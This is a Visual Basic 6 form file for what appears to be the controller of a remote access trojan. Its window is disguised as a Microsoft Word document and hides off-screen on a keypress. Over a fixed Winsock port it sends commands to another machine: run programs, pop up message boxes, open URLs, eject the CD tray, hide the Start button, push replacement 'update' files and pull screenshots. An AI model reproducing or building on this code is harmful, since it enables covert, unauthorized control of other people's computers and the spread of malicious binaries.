VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "comdlg32.ocx"
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Microsoft Word - Document 1"
   ClientHeight    =   2400
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   3960
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2400
   ScaleWidth      =   3960
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox othercmds 
      Height          =   285
      Left            =   120
      TabIndex        =   16
      Top             =   2040
      Width           =   3765
   End
   Begin VB.TextBox msgtitle 
      Height          =   285
      Left            =   2730
      TabIndex        =   15
      Text            =   "TITLE"
      Top             =   510
      Width           =   555
   End
   Begin VB.TextBox msgtype 
      Height          =   285
      Left            =   3330
      TabIndex        =   14
      Text            =   "okonly"
      Top             =   510
      Width           =   525
   End
   Begin VB.TextBox host 
      Height          =   285
      Left            =   2160
      TabIndex        =   12
      Top             =   1650
      Width           =   1485
   End
   Begin VB.CommandButton disconnect 
      Caption         =   "disconnect"
      Height          =   375
      Left            =   1020
      TabIndex        =   11
      Top             =   1590
      Width           =   1095
   End
   Begin VB.CommandButton connect 
      Caption         =   "connect"
      Height          =   375
      Left            =   90
      TabIndex        =   10
      Top             =   1590
      Width           =   945
   End
   Begin VB.CommandButton hishstart 
      Caption         =   "hide/show start"
      Height          =   375
      Left            =   2550
      TabIndex        =   9
      Top             =   1230
      Width           =   1335
   End
   Begin MSComDlg.CommonDialog cdl 
      Left            =   510
      Top             =   -390
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CommandButton browse 
      Caption         =   ".."
      Height          =   255
      Left            =   3600
      TabIndex        =   8
      Top             =   900
      Width           =   285
   End
   Begin MSWinsockLib.Winsock socket 
      Left            =   120
      Top             =   -360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.CommandButton closecd 
      Caption         =   "close cdrom"
      Height          =   375
      Left            =   1320
      TabIndex        =   7
      Top             =   1230
      Width           =   1245
   End
   Begin VB.CommandButton opencd 
      Caption         =   "open cdrom"
      Height          =   375
      Left            =   90
      TabIndex        =   6
      Top             =   1230
      Width           =   1245
   End
   Begin VB.TextBox apppath 
      Height          =   285
      Left            =   1410
      TabIndex        =   5
      Text            =   "FILEPATH"
      Top             =   870
      Width           =   2115
   End
   Begin VB.CommandButton runapp 
      Caption         =   "run app"
      Height          =   375
      Left            =   90
      TabIndex        =   4
      Top             =   810
      Width           =   1245
   End
   Begin VB.TextBox msg 
      Height          =   285
      Left            =   1410
      TabIndex        =   3
      Text            =   "MESSAGE"
      Top             =   510
      Width           =   1275
   End
   Begin VB.CommandButton msgbox 
      Caption         =   "msg box"
      Height          =   375
      Left            =   90
      TabIndex        =   2
      Top             =   450
      Width           =   1245
   End
   Begin VB.TextBox url 
      Height          =   285
      Left            =   1410
      TabIndex        =   1
      Text            =   "http://"
      Top             =   150
      Width           =   2475
   End
   Begin VB.CommandButton urlnav 
      Caption         =   "url nav"
      Height          =   375
      Left            =   90
      TabIndex        =   0
      Top             =   90
      Width           =   1245
   End
   Begin VB.Label status 
      AutoSize        =   -1  'True
      Caption         =   "0"
      Height          =   195
      Left            =   3750
      TabIndex        =   13
      Top             =   1710
      Width           =   90
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Dim hs As Boolean
Const portnum As Integer = 11297
Dim mode As String

Private Sub browse_Click()
    cdl.Filter = "*.*|*.*"
    cdl.ShowOpen
    apppath.Text = cdl.FileName
End Sub

Private Sub connect_Click()
    socket.connect Trim(host.Text), portnum
    DoEvents
End Sub

Private Sub disconnect_Click()
    socket.Close
    status = "0"
End Sub

Private Sub Form_KeyPress(KeyAscii As Integer)
    If KeyAscii = 96 And h = False Then
        frmMain.Top = -10000
        frmMain.Left = -10000
        h = True
    ElseIf KeyAscii = 96 Then
        frmMain.Top = 0
        frmMain.Left = 0
        h = False
    End If
End Sub

Private Sub Form_Load()
    frmMain.KeyPreview = True
    h = False
    hs = False
End Sub

Private Sub hishstart_Click()
    If (hs = False) Then
        socket.SendData "hidestart"
        hs = True
    ElseIf (hs = True) Then
        socket.SendData "showstart"
        hs = False
    End If
End Sub

Private Sub msgbox_Click()
    socket.SendData "msgbox|" & msg.Text & "|" & msgtype.Text & "|" & msgtitle.Text
End Sub

Private Sub othercmds_KeyPress(KeyAscii As Integer)
    Dim data() As String
    Dim chunk As String
    
    If (KeyAscii = 13) Then
        KeyAscii = 0 'rid that horrifying beep
        
        If socket.State = 7 Then
            socket.SendData othercmds.Text
            data() = Split(othercmds.Text, "|")
            
            If LCase((data(0))) = "update" Then
                Open data(1) For Binary As #1  'open the file
                    Pause 2000
                
                    Do While Not EOF(1)            'send it...
                        If (socket.State = 7) Then
                            chunk$ = Input(4196, #1)
                            socket.SendData chunk$
                            Pause 300
                            DoEvents
                        End If
                    Loop
                
                    Pause 1000
                Close #1
                
                If (socket.State = 7) Then
                    socket.SendData "closefile"
                End If
            End If
                    
            othercmds.Text = ""
        End If
    End If
End Sub

Private Sub runapp_Click()
    socket.SendData "runapp|" & apppath.Text
End Sub

Private Sub socket_Close()
    If socket.State <> sckClosed Then socket.Close
    status = "0"
End Sub

Private Sub socket_Connect()
    status = "1"
End Sub

Private Sub socket_DataArrival(ByVal bytesTotal As Long)
    Dim data As String
    
    socket.GetData data, vbString
    
    If (data = "closepic") Then
        Close #1
        frmScreen.Picture = LoadPicture(App.Path & "\screen.bmp")
        frmScreen.Show
        Exit Sub
    End If
    
    If (data = "screenget") Then
        Open App.Path & "\screen.bmp" For Binary As #1
        mode = "getpic"
        Exit Sub
    End If
    
    If (mode = "getpic") Then
        Put #1, , data$
    End If
End Sub

Private Sub socket_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    If socket.State <> sckClosed Then socket.Close
    status = "0"
End Sub

Private Sub opencd_Click()
    socket.SendData "opencd"
End Sub

Private Sub closecd_Click()
    socket.SendData "closecd"
End Sub

Private Sub urlnav_Click()
    socket.SendData "urlnav|" & url.Text
End Sub
